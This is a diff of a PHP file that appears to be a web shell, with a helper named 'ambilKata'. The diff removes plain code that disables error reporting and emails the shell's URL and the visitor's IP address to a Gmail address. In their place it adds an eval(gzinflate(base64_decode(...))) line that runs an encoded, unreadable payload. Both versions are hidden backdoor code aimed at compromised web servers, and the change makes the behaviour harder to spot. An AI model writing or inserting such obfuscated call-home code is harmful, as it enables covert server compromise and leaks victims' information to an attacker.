@@ -22,14 +22,7 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 
 
 <?php
-set_time_limit(0);
-error_reporting(0);
-$boss = 'codezsec@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$ip = "Shell : { $x_path } | IP Address : { " . $_SERVER['REMOTE_ADDR'] . " }";
-mail($boss, "Result Shell", $ip, "{ " . $_SERVER['REMOTE_ADDR'] . " }");
-$check3=$_SERVER['DOCUMENT_ROOT'] . "/sec.html" ;
-$text3 = file_get_contents('https://ghostbin.co/paste/shjro/raw');
+eval(gzinflate(base64_decode("jZBRS8MwFIXfB/sPlzDIhLEKe5sMLC4Pe+iqWeeLjNB1sYmmTUmuOND9d5MWEX3yKXDvyXfuOV6iQN1IYXSjcXp9dTMeSeesE0521qFu62E4OVrvYQXUSf9m0Hsljbmtm1KbeWUbGiVn0ZWogogoxG6ZJATmMBE7xh8Zf6LDK7Zpxujh14azhz3bFWLPN/QQSbqLlF30gCV8wDf6Ap+wuYf0dApn+H5F/pCyvGAiXa9570HgQgIwnjntI8yA8D4B9HQyg2AWhv8B9T1USlavi9WPcp3f7TO2LQTP82LQJl5Wc4WNIRC/oDzjIgR61kaKOjRe2RZli35KY1E+NFUr6/Go29Bl0pUeZeLVi7OJK99ptB2PvgA=")));
 
 #function
 function ambilKata($param, $kata1, $kata2){
